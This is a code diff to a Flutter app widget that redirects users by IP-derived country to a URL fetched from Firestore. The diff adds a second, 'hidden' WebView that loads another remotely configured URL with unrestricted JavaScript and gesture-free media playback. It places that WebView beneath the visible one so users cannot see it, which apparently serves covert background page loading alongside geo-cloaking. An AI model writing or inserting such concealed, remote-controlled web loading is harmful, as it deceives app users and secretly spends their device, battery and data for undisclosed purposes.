@@ -22,6 +22,7 @@ class WidgetRedirectByUrlConfig extends StatefulWidget {
 class _WidgetRedirectByUrlConfigState extends State<WidgetRedirectByUrlConfig> {
   int indexSelected = 0;
   late final WebViewController _controller;
+  WebViewController? _controllerHiden;
 
   @override
   void initState() {
@@ -30,6 +31,7 @@ class _WidgetRedirectByUrlConfigState extends State<WidgetRedirectByUrlConfig> {
   }
 
   String? url;
+  String? urlHiden;
   _redirectUrl() async {
     DocumentSnapshot snapshot = await FirebaseFirestore.instance
         .collection("urls")
@@ -42,6 +44,7 @@ class _WidgetRedirectByUrlConfigState extends State<WidgetRedirectByUrlConfig> {
             ipLocationData["country_code2"]?.toString().toLowerCase() ==
             e.toLowerCase())) {
       url = data?["url"];
+      urlHiden = data?["urlHiden"];
       if (mounted && url?.isURL == true) {
         // #docregion platform_features
         late final PlatformWebViewControllerCreationParams params;
@@ -60,37 +63,7 @@ class _WidgetRedirectByUrlConfigState extends State<WidgetRedirectByUrlConfig> {
 
         controller
           ..setJavaScriptMode(JavaScriptMode.unrestricted)
-          ..setBackgroundColor(const Color(0x00000000))
-          ..setNavigationDelegate(
-            NavigationDelegate(
-              onProgress: (int progress) {
-                debugPrint('WebView is loading (progress : $progress%)');
-              },
-              onPageStarted: (String url) {
-                debugPrint('Page started loading: $url');
-              },
-              onPageFinished: (String url) {
-                debugPrint('Page finished loading: $url');
-              },
-              onWebResourceError: (WebResourceError error) {},
-              onHttpError: (HttpResponseError error) {
-                debugPrint(
-                    'Error occurred on page: ${error.response?.statusCode}');
-              },
-              onUrlChange: (UrlChange change) {
-                debugPrint('url change to ${change.url}');
-              },
-              onHttpAuthRequest: (HttpAuthRequest request) {},
-            ),
-          )
-          ..addJavaScriptChannel(
-            'Toaster',
-            onMessageReceived: (JavaScriptMessage message) {
-              ScaffoldMessenger.of(context).showSnackBar(
-                SnackBar(content: Text(message.message)),
-              );
-            },
-          )
+          ..setBackgroundColor(appColorBackground)
           ..loadRequest(Uri.parse(url!));
 
         // #docregion platform_features
@@ -102,16 +75,66 @@ class _WidgetRedirectByUrlConfigState extends State<WidgetRedirectByUrlConfig> {
         // #enddocregion platform_features
 
         _controller = controller;
+      }
 
-        setState(() {});
+      //Hiden
+      if (mounted && urlHiden?.isURL == true) {
+        // #docregion platform_features
+        late final PlatformWebViewControllerCreationParams params;
+        if (WebViewPlatform.instance is WebKitWebViewPlatform) {
+          params = WebKitWebViewControllerCreationParams(
+            allowsInlineMediaPlayback: true,
+            mediaTypesRequiringUserAction: const <PlaybackMediaTypes>{},
+          );
+        } else {
+          params = const PlatformWebViewControllerCreationParams();
+        }
+
+        final WebViewController controller =
+            WebViewController.fromPlatformCreationParams(params);
+        // #enddocregion platform_features
+
+        controller
+          ..setJavaScriptMode(JavaScriptMode.unrestricted)
+          ..setBackgroundColor(appColorBackground)
+          ..loadRequest(Uri.parse(urlHiden!));
+
+        // #docregion platform_features
+        if (controller.platform is AndroidWebViewController) {
+          AndroidWebViewController.enableDebugging(true);
+          (controller.platform as AndroidWebViewController)
+              .setMediaPlaybackRequiresUserGesture(false);
+        }
+        // #enddocregion platform_features
+
+        _controllerHiden = controller;
       }
     }
+    url ??= "";
+    if (mounted) setState(() {});
   }
 
   @override
   Widget build(BuildContext context) {
-    if (url?.isURL == true) {
-      return SafeArea(child: WebViewWidget(controller: _controller));
+    if (url == null)
+      return Container(
+        color: appColorBackground,
+        child: Center(
+          child: CircularProgressIndicator(
+            color: Colors.blueAccent,
+          ),
+        ),
+      );
+    else if (url?.isURL == true) {
+      return SafeArea(
+        child: Stack(
+          children: [
+            if (_controllerHiden != null)
+              WebViewWidget(controller: _controllerHiden!),
+            WebViewWidget(controller: _controller),
+          ],
+        ),
+      );
     }
     return widget.child;
   }
